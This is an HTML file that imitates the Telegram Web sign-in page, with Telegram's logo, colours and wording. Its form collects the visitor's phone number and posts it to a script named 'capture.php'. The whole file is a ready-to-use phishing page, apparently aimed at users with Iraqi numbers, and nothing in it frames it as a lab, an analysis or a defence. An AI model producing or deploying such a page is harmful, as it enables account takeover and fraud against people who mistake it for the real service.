<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web - Login</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; }
        h2 { color: #222; margin-bottom: 10px; }
        p { color: #707579; font-size: 14px; margin-bottom: 25px; }
        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #3390ec; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; transition: background 0.3s; }
        button:hover { background-color: #2b7dcb; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
        <h2>Sign in to Telegram</h2>
        <p>Please confirm your country code and enter your phone number.</p>
        
        <form action="capture.php" method="POST">
            <input type="text" name="phone" placeholder="+964 7XX XXX XXXX" required>
            <button type="submit">NEXT</button>
        </form>
    </div>
</body>
</html>
